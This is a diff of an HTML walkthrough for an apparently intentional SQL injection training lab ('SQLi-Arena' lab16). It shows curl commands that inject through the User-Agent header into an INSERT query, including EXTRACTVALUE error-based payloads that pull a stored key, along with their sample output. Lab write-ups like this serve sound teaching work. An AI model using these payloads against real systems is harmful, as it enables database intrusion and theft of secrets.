@@ -33,7 +33,7 @@
         <span class="terminal-title">Step 2. Custom User-Agent</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -H "User-Agent: test123" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
+        <span class="prompt">$ </span>curl -H "User-Agent: test123" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
         <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'test123', NOW())<br><br>
         <span class="prompt">Result: </span>Your visit has been logged. Visitors table now shows "test123" as the User-Agent -- confirms the header value is stored.
     </div>
@@ -53,7 +53,7 @@
         <span class="terminal-title">Step 3. Trigger SQL Error</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -H "User-Agent: '" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
+        <span class="prompt">$ </span>curl -H "User-Agent: '" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
         <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''', NOW())' at line 1<br><br>
         <span class="prompt">Analysis: </span>The error reveals the INSERT ... VALUES ('127.0.0.1', '<strong>'</strong>', NOW()) context. The User-Agent is the second parameter in the VALUES clause.
     </div>
@@ -74,7 +74,7 @@
         <span class="terminal-title">Step 4. Error-Based Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -H "User-Agent: test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1" \<br>
+        <span class="prompt">$ </span>curl -H "User-Agent: test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab16"<br><br>
         <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1', NOW())<br><br>
         <span class="prompt">Error: </span>XPATH syntax error: '~FLAG{h34d3r_us3r_4g3nt_1nj}'<br><br>
@@ -96,7 +96,7 @@
         <span class="terminal-title">Step 5. Subquery in INSERT</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -H "User-Agent: hacked', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -" \<br>
+        <span class="prompt">$ </span>curl -H "User-Agent: hacked', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab16"<br><br>
         <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'hacked', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -', NOW())<br><br>
         <span class="prompt">Note: </span>This replaces the visit_time with the flag value. However, this fails because the column types don't match (DATETIME vs VARCHAR). The error-based approach (Step 4) is more reliable.
@@ -163,7 +163,7 @@
         <span class="terminal-title">Step 8. Python Automation (lab16_header_useragent.py)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>python3 scripts/lab16_header_useragent.py http://localhost/SQLi-Arena/<br><br>
+        <span class="prompt">$ </span>python3 scripts/lab16_header_useragent.py http://localhost/SQLi-Arena<br><br>
         <span class="prompt">[*] </span>Injection point: User-Agent HTTP header<br>
         <span class="prompt">[*] </span>Method 1: EXTRACTVALUE error-based extraction<br>
         <span class="prompt">[*] </span>Payload (in User-Agent header):<br>
